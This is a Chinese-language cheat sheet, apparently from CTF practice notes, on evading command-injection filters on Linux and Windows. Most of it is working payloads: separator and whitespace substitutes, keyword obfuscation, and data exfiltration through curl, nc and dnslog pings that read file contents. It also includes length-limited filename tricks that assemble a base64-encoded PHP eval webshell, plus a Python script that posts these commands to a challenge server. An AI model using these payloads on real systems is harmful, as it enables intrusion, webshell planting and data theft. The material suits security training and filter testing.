## Linux

### 分隔符的限制

```php
1.换行符         %0a
2.回车符         %0d(利用fuzz测试从%00-%ff)
3.连续指令       ;
4.后台进程       &                 # java -jar test.jar &  表示进行放到后台执行，无法被ctrl+c杀死
5.管道符         |           # echo 'ls' | bash
6.逻辑符         ||  &&          # skjkfj||ls  由于前面命令不存在而为假，转而执行后面的ls
```

### 空白符的限制

```php
<
$IFS
${IFS}
$IFS$(1-9)                                  #从1到9，可以进行fuzz
{cat,flag.txt}
%09 用于url传递，类似于%09代替空格
```

### 过滤关键词cat

```php
less, tac, more, less, head, tail, nl, od        # 命令代替
ca""t
ca''t
ca``t
ca\t
a=c;b=at;$a$b xxx.php                            # 变量拼接
c${u}at                                          # 因为c$uat 系统不知道你要执行的是$u还是$uat，因此加上界定符，命令成功运行
l`$u`s
wh$1oami
who$@ami
whoa$*mi
```

```php
a=l;b=s;$a$b                                   # 变量拼接
echo d2hvYW1p | base64 -d`                     # base64编码
substr string pos end                          # 利用字符串切割得到我们想要的字符，但是这种方法的利用考虑尝试.sh文件,未复现
echo ${PATH:0:1} # 分割获取从0开始获取1个字符，这里是这个意思
echo "`expr$IFS\substr\$IFS\$(pwd)\$IFS\1\$IFS\1`"
echo "`expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1`"   => $PWD 代表环境变量
expr${IFS}substr${IFS}$SESSION_MANAGER${IFS}14${IFS}1
$u                                            # $u在Linux中代表的是空字符串，并不是代表是空格,这里有一些好玩的技巧
c${u}at index$u.php$u
c`$u`at index$u.php$u
```

#### 同样可以构造无字母数字的webshell

[见这里](No_num_and_char_webshell.md)

### 无回显

> 判断思路

```php
延时              ls|sleep(3)
HTTP请求          curl
DNS请求           ping
```

> curl进行检测

```php
有一台可以进行通信的vps
vps 上执行 nc -lvnp 4444
在目标机器上执行curl vps:4444
观察vps的连接情况
若出现返回，则说明这里是存在命令执行的

或者是编写sh脚本
curl ip/1.sh > /tmp/1.sh
1.sh里面写
内容 | nc vps的ip 监听端口
让受害机器将数据发送给你 
```

> dnslog进行检测

```php
由于域名转换成ip需要经过一次dns解析，所以可以通过dnslog将数据外带出来
推荐如下两个dnslog地址:
http://dnslog.cn
http://ceye.io/records/dns
```

#### 外带过程限制

```php
1、长度的限制，外带的数据不能过长
(解决思路:尝试将结果截断,分批次外带)
2、外带出来的数据中不能包含空格，很多特殊字符如（;>?<"'）,我fuzz到的结果仅可以拼接_
(解决思路:使用Linux的字符替换函数将可能出现的字符替换后再进行外带)
```

我先把我的思路放在下面，查了一下域名可用字符，合法字符只有中文汉字|_|-这三个

```php
这里只能讲一下思路,利用sed函数将空格替换成_,也可以替换成NULL
where_is_flag.php的内容是: <?php $flag={xxxxxxxx}?>
要目标机器去ping `cat where_is_flag.php|sed s/[[:space:]]/_/`.vflkgp.dnslog.cn
sed s/[[:space:]]// 会将cat读取的内容里面的所有空格替换为_
ping -c 4 `cat 1.php|sed s/[[:space:]]/_/|sed s/\</_/|sed s/\?/_/|sed s/\;/_/|sed s/\?/_/|sed s/\>/_/|sed s/\(/_/|sed s/\)/_/`.eugcs.ceye.io
可以尝试将所有可能出现的字符全部替换一遍
```

#### 利用

```php
1.写入webshell
2.敏感数据外带
```

### 命令长度限制

#### 思路

```php
wget 远程下载
echo + >写入文件
mv 重命名
w>d\\ 写文件名后再通过 ls -t>0将文件名全部按时间顺序写入到0中 然后sh 0执行脚本
```

#### 限制长度 15

1. 通过`wget vps/a` 获取文件之后`mv a xx`

2. 通过echo写入shell

   ```php
   echo \<?php>1
   echo eval\(>>1
   echo \$_GET>>1
   echo \[1\]>>1
   echo \)\;>>1
   ```

#### 限制长度 7

```php
介绍一下用到的命令:
w>a
向目录中写入一些数据并生成a文件
ls -t
按照时间顺序排列当前文件名
sh
用/bin/bash 执行文件中的命令集合
```

**这里的思路就是将**payload分隔成一条条的命令，然后利用 w> 生成文件名为payload的文件集合，利用ls写到一个文件中，再用sh执行分割的命令， 同时为了防止shell中的特殊字符影响，采用base64编码。

```php
echo PD9waHAgZXZhbCgkX0dFVFsxXSk7\|base64 -d\>1.php
```

```php
m>hp
m>1.p\\
m>d\>\\
m>\ -\\
m>e64\\
m>bas\\
m>7\|\\
m>XSk\\
m>Fsx\\
m>dFV\\
m>kX0\\
m>bCg\\
m>XZh\\
m>AgZ\\
m>waH\\
m>PD9\\
m>o\ \\
m>ech\\
ls -t>0
sh 0
```

**注意**：这里需要对特殊字符`空格 | ;`等等可能影响的字符进行转义

执行脚本：

```python
url = "http://88857b81-3c00-44d5-a863-5b281424e563.challenge.ctf.show/api/tools.php"
# url = "http://127.0.0.1:9999/test.php"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Cookie": "UM_distinctid=17fe95519f57f-03751c35734564-4c3e247b-151800-17fe95519f611dc"
}
data = {
    "cmd": ""
}
print(url[:-13])
with open("E:\\my_vscode_python\\webScript\\byte7.txt", 'r') as f:
    for i in f.readlines():
        # url = url1 + i.strip()
        data["cmd"] = i.strip()
        requests.post(url, data=data, headers=headers)
        time.sleep(1)
        print(f"已经请求{url}")
res = requests.get(url[:-13]+"/1.php")
if res.status_code == 200:
    print("ok, You have already upload!")
```

#### 限制长度 5

思考如何突破 `ls -t>z`

先生成一个里面存有`ls -t>z`的文件a，利用`sh a`产生带有exp的z文件

```php
ls -rt>z

由于Linux系统中ls默认排序是根据字符顺序排序的，所以拆解命令

>l\\
>s\ \\
>-rt\\
>\>z\\
ls>a
```

#### 限制长度 4

同样思路也是解决 `ls -t>z`这个问题，但是如果是四个字符的话，很难找到相应的字母来固定ls执行后的顺序，所以这里有新的知识点

> 输入通配符*， Linux会把第一个列出来的文件名当作命令，剩下的文件名当作参数

```php
>id
>root
*
uid=0(root) gid=0(root) 组=0(root)
```

> 增加字母来限定被用来当作命令和参数的文件

```text
>ls
>lss
>lsss
*s
lss  lsss
```

> rev将输出内容导致， dir将当前文件列出且不换行

```text
>rev
echo 1234 > v
*v （等同于命令：rev v）
ls -t >0
```

所以我们需要构造的文件名为：`0< ht- sl`(这里需要用ls 的参数h 将t往前拉)，所以最终payload如下:

```text
>dir
>e\>
>ht-
>sl
ls>a
```

![img](https://pic2.zhimg.com/80/v2-f1bce13a42370b2fbe4852319189672d_1440w.jpg)

```text
>dir
>f\>
>ht-
>sl
*>v
>rev
*v>0
[root@localhost test]# cat 0
ls  -th  >f
```

**payload如下**

```text
>hp
>p\\
>1.\\
>\>\\
>-d\\
>\}\\
>IFS\\
>\{\\
>\$\\
>base64\\
>\|\\
>PD9waHAgZXZhbCgkX0dFVFsxXSk7\\        # 这里是因为我偷懒了，忽略字符长度限制的payload，实际上这里按照思路一个字母一个字母的分割也是没问题的
>echo\ \\
```

## Windows

### 关键词

```php
whoami //正常执行
w"h"o"a"m"i //正常执行
w"h"o"a"m"i" //正常执行
wh""o^a^mi //正常执行
wh""o^am"i //正常执行
((((Wh^o^am""i)))) //正常执行

然你可以加无数个”但不能同时连续加2个^符号，因为^号是cmd中的转义符，跟在他后面的符号会被转义
w"""""""""""""hoami //正常执行
w"""""""""""""hoa^m""i //正常执行
w"""""""""""""hoa^^m""i //执行错误
```

```php
set a=whoami //设置变量a的值为whoami
%a% //引用变量a的值，直接执行了whoami命令

set a=who
set b=ami
%a%%b% //正常执行whoami

set a=ser&& set b=ne&& set c=t u && call %b%%c%%a%
//在变量中设置空格，最后调用变量来执行命令
```

#### 切割字符串

```php
%a:~0% //取出a的值中的所有字符
此时正常执行whoami
%a:~0,6% //取出a的值，从第0个位置开始，取6个值
此时因为whoami总共就6个字符，所以取出后正常执行whoami
%a:~0,5% //取5个值，whoam无此命令
%a:~0,4% //取4个值，whoa无此命令

通过set命令进行变量的获取，之后获取26个字母
//空格过滤
net%CommonProgramFiles:~10,1%user
//配合符号
n^et%CommonProgramFiles:~10,1%us^er
//自己设置符号
set TJ=a bcde/$@\";fgphvlrequst?
//比如上面这段组合成一个php一句话不难吧？
```

### 逻辑运算符妙用

```text
假设执行这两个明明，中间的分隔符fuzz测试: 
whoami%7cdir
%7c  ---------- | ---------- 只会执行 后一个命令
%26  ---------- & ---------- 两个命令同时执行
%00  ---------- NULL-------- 执行前一个命令(这里有一个想法就是尝试使用00截断有可能看到函数报错信息)
%0a  ---------- 换行符------- 执行前一个命令
```

|在cmd中，可以连接命令，且只会执行后面那条命令

1. `whoami | ping www.baidu.com`
2. `ping www.baidu.com | wh""oam^i`
3. `//两条命令都只会执行后面的`

而||符号的情况下，只有前面的命令失败，才会执行后面的语句

1. `ping 127.0.0.1 || whoami //不执行whoami`
2. `ping xxx. || whoami //执行whoami`

而&符号，前面的命令可以成功也可以失败，都会执行后面的命令，其实也可以说是只要有一条命令能执行就可以了，但whoami放在前面基本都会被检测

1. `ping 127.0.0.1 & whoami //执行whoami`
2. `ping xxx. & whoami //执行whoami`

而&&符号就必须两条命令都为真才可以了

1. `ping www.baidu.com -n 1 && whoami //执行whoami`
2. `ping www && whoami //不执行whoami`